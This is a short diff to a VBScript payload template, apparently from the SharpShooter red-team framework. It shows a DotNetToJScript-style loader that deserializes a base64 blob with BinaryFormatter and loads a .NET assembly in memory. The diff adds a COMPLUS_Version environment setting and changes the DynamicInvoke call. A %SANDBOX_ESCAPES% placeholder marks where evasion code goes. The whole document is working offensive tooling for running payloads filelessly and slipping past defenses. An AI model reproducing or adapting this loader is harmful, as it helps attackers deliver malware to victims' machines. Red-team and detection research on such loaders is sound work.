@@ -4,6 +4,7 @@ End Sub
 Sub SetVersion
 Dim shell
 Set shell = CreateObject("WScript.Shell")
+shell.Environment("Process").Item("COMPLUS_Version") = "v4.0.30319"
 End Sub
 
 Function Base64ToStream(b)
@@ -233,13 +234,10 @@ s = s & "AAAAAAABDQAAAAQAAAAJFwAAAAkGAAAACRYAAAAGGgAAACdTeXN0ZW0uUmVmbGVjdGlvbi5
 s = s & "bWJseSBMb2FkKEJ5dGVbXSkIAAAACgsA"
 entry_class = "SharpShooter"
 
-Dim fmt, al, d, o
+Dim fmt, d, o
 Set fmt = CreateObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
-Set al = CreateObject("System.Collections.ArrayList")
-al.Add fmt.SurrogateSelector
-
 Set d = fmt.Deserialize_2(Base64ToStream(s))
-Set o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)
+Set o = d.DynamicInvoke(Nothing).CreateInstance(entry_class)
 
 %SANDBOX_ESCAPES%
 
